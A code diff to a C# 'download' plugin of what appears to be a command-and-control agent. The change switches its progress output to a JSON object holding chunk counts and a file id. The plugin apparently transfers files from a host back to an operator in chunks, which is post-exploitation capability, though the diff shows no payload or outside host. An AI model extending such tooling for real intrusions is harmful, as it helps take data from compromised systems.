@@ -5,9 +5,21 @@ using System;
 using System.Collections.Concurrent;
 using System.Text.Json;
 using System.Security.Principal;
+using System.Globalization;
 
 namespace Agent
 {
+    public class DownloadJsonResponse
+    {
+        public int currentChunk { get; set; }
+        public int totalChunks { get; set; }
+        public string file_id { get; set; }
+
+        public string ToJson()
+        {
+            return JsonSerializer.Serialize(this);
+        }
+    }
     public class Plugin : IFilePlugin
     {
         public string Name => "download";
@@ -63,7 +75,12 @@ namespace Agent
             //Send the first response, start download process.
             await messageManager.AddResponse(new DownloadResponse
             {
-                user_output = $"Download Started.",
+                user_output = new DownloadJsonResponse()
+                {
+                    currentChunk = 0,
+                    totalChunks = downloadJob.total_chunks,
+                    file_id = string.Empty,
+                }.ToJson(),
                 download = new DownloadResponseData()
                 {
                     total_chunks = downloadJob.total_chunks,
@@ -107,7 +124,12 @@ namespace Agent
             DownloadResponse dr = new DownloadResponse()
             {
                 task_id = response.task_id,
-                user_output = completed ? $"{downloadJob.file_id}" : String.Empty,
+                user_output = new DownloadJsonResponse()
+                {
+                    currentChunk = downloadJob.chunk_num,
+                    totalChunks = downloadJob.total_chunks,
+                    file_id = downloadJob.file_id,
+                }.ToJson(),
                 //user_output = downloadJob.chunk_num.ToString(),
                 download = new DownloadResponseData
                 {
